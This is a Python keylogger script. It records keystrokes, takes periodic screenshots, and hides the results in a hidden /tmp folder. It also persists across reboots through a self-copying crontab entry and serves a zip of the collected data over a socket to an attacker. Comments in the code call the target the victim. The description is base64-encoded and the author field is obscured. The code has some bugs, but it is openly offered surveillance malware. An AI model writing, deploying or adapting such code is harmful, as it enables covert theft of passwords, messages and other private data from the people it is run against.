#!/usr/bin/env python3

'''
----------------------------------------------------------------------------------------------------
THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!

Author : 00110101 00110001 00100000 00110101 00110111 00100000 00110111 00111000 
		 00100000 00110110 01100011 00100000 00110110 00110101 00100000 00110100 00110111 
		 00100000 00110110 01100011 00100000 00110111 01100001 00100000 00110100 00111001 
		 00100000 00110100 00110110 00100000 00110100 01100001 00100000 00110111 00110110 
		 00100000 00110101 01100001 00100000 00110100 00111000 00100000 00110100 01100001 
		 00100000 00110111 00110000 00100000 00110101 01100001 00100000 00110011 00110011 
		 00100000 00110101 00110110 00100000 00110110 01100011 00100000 00110110 00110101 
		 00100000 00110110 00110111 00100000 00110011 01100100 00100000 00110011 01100100

Date : 2020-02-09

Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
			  gb24gYSBrZXlib2FyZCwgdGFrZXMgYSBzY3JlZW5zaG90IG9mIHRoZSB2aWN0aW1zIHNjcmVlbiwg
			  YW5kIGJpbmRzIGEgc2VydmVyIHNvY2tldCB0byB0cmFuc2ZlciBhIHppcCBmaWxlIG9mIGFsbCB0aGUgZ
			  2F0aGVyZWQgZGF0YSBvdmVyYSBzb2NrZXQgY29ubmVjdGlvbi4gVGhlIGtleXNlbGYubG9nZ2VyIHRleHQg
			  ZmlsZSBpcyB1cGRhdGVkIGV2ZXJ5IDIwIHNlY29uZHMgYW5kIHRoZSBzY3JlZW4gY2FwdHVyZSBvY2N1c
			  nMgZXZlcnkgMiBtaW51dGVzLiBBcyBvZiByaWdodCBub3cgdGhpcyBwcm9ncmFtIHdpbGwgb25seSB3b3Jr
			  IG9uIExpbnV4IG1hY2hpbmVzIGJ1dCB3aWxsIGJlIHVwZGF0ZWQgaW4gdGhlIG5lYXIgZnV0dXJlIGZvciBXa
			  W5kb3dzIG1hY2hpbmUgdG9vLg==
			  
			  ___   _      ___   _      ___   _      ___   _      ___   _
			 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
			  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
			 /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
			       |____________|____________|____________|____________|
			                             |            |            |
			                         ___  \\_      ___  \\_      ___  \\_
			                        [(_)] |=|    [(_)] |=|    [(_)] |=|
			                         '-`  |_|     '-`  |_|     '-`  |_|
			                        /mmm/        /mmm/        /mmm/
					                  !
----------------------------------------------------------------------------------------------------
'''

# import module for capturing keystrokes
from pynput import keyboard
# import module to zip files
from zipfile import ZipFile
# import module to grab screenshots
import pyautogui as pygrab
# import module to run functions at specific times
import threading
# import socket to initialize socket for file transfer
import socket as sck
# import os and time for file path work and naming files
import os, time
# import subprocess to execute terminal commands
import subprocess as subp


'''************************************************************'''
''' 					   CLASS DEFINITION                    '''
'''************************************************************'''
class Keylogger:
	# invoking the constructor will declare class variable self.log
	def __init__(self):
		self.log = ''
		# create cronjob
		self.create_cronjob()
		# get path of where the initial file was downloaded
		self.initial_file_path = os.getcwd()
		# get /tmp folder name
		self.directory = self.make_get_dir()
		# replicate the initial file into the /tmp/.folder
		# to continue to execute keylogger after reboot
		self.replicate()

	'''
	Begin capturing keystrokes
	'''
	def start_listening(self):
		with keyboard.Listener(
			on_press=self.on_press) as listener:
			# begin logging to keylog file
			self.log_to_file()
			# begin taking screen shots
			self.save_screen()
			listener.join()

	'''
	make directory in /tmp folder
	'''
	def make_get_dir(self):
		# try making directory
		try:
			dir_to_create = '/tmp/.folder/'
			os.mkdir(dir_to_create)
		# if it already exists do nothing
		except OSError:
			pass
		# return the name of the directory created
		return dir_to_create

	'''
	Handles the action taken when a 
	key is pressed.
	'''
	def on_press(self, key):
		# try casting key as string
		try:
			self.log += str(key.char)
		# handling special characters
		except AttributeError:
			# if person presses space
			if key == key.space:
				self.log += ' '
				# if person presses enter
			elif key == key.enter: self.log += '\n'
			# if person presses backspace
			elif key == key.backspace: self.log += ''
			# if person presses control key
			elif key == key.ctrl: self.log += ' ctrl+'
			else:
				self.log += str(key)

	'''
	Logging to a file every 20 seconds
	'''
	def log_to_file(self):
		# open file
		f = open(self.make_get_dir() + 'log.txt', 'w')
		# write self.log to file
		f.write(self.log)
		# every 20 seconds invoke this function
		clock = threading.Timer(20, self.log_to_file)
		# begin clock
		clock.start()

	'''
	get time image was taken append it to 
	the name of the images file
	'''
	def make_name(self):
		# seconds since the creation of python
		seconds_since_epoch = time.time()
		# return full date into a list
		date = time.ctime(seconds_since_epoch).split()
		# return the desired parts of the date list
		return date[1] + '-' + date[2] + '-' + date[3]

	'''
	Take a screenshot of the victions computer
	every 2 minutes and save it to /tmp/.folder directory
	'''
	def save_screen(self):
		# take a screenshot
		image = pygrab.screenshot()
		# get time to append to image file name
		time = self.make_name()
		# save image to the directory that was created
		image.save(r'/tmp/.folder/normal_'+time+'.png')
		# repeat function every two minutes
		take_screen = threading.Timer(120, self.save_screen)
		# begin timer
		take_screen.start()

	'''
	Zip folder contents before sending as email
	Param : directory of folder location
	'''
	def zip_folder(self, direc):
		# list to contain all path of files to zip
		file_paths = []
		zip_name = 'zipped_file.zip'

		for root, directories, files in os.walk(direc):
			for file in files:
				# joining absolute path with file name
				filepath = os.path.join(root, file)
				# append filepath to list containing all file paths
				file_paths.append(filepath)

		# creating zipped file
		with ZipFile('/tmp/.folder/'+zip_name, 'w') as zipped:
			# for every file in list of file paths,
			# add file to zip file
			for file in file_paths:
				zipped.write(file)

			return zipped

	'''
	send the zipped folder to the attacker
	Param : zipped file created by zip_folder function
	'''
	def socket_listen_send(self):
		# get zipped file composed of folders contents
		zipped_file = self.zip_folder(self.directory)
		# creating socket context manager
		with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as soc:
			# get IP address of victim and assign listening port
			IP=sck.gethostbyname(sck.gethostname())
			print(IP)
			PORT=1945 # the end of ww2

			# bind socket to victim IP address and port
			sck.bind((IP, PORT))
			# listen for incoming connections
			sck.listen(5)
			# accept and receive connection
			connection, address = sck.accept()
			# open file to read as bytes
			with open(zipped_file, 'rb') as zip_file:
					# read bytes from file
					content = zip_file.read()
					# send bytes data over socket
					connection.send(content)
					# closing file to end loop
					zip_file.close()


	'''
	Create cronjob to startup keyself.logger after reboot
	'''
	def create_cronjob(self):
		# echo cronjob command into file
		subp.call(['echo @reboot /tmp/.folder/run.py > my-crontab'], shell=True)
		# update crontab with the command in my conjob file
		subp.call(['crontab', 'my-crontab'])

	'''
	replicate keylogger in /tmp/folder to
	continue to turn on keylogger after reboot
	'''
	def replicate(self):
		# create file run.py in location of collected data
		subp.call(['touch', self.directory + '/run.py'])
		# copy contents of keylog py file over to /tmp
		# to make sure cronjob finds python file to interpret
		subp.call(['cp', self.initial_file_path + '/keylogger.py', self.directory + 'run.py'])


'''
*************
MAIN IS HERE!
*************
'''
def initiate():
	# instantiating object
	my_obj = Keylogger()
	# make directory
	my_obj.make_get_dir()
	# invoke this function to begin listening
	my_obj.start_listening()
	# listen for socket connections and send at zipped file
	my_obj.socket_listen_send()


if __name__ == '__main__':
	print('''
			PYTHON KEYLOGGER 2020
. -------------------------------------------------------------------.        
| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
|                                                                    |        
| [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
| [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
| [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
| [^][\\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
`--------------------------------------------------------------------'        
	''')

	initiate()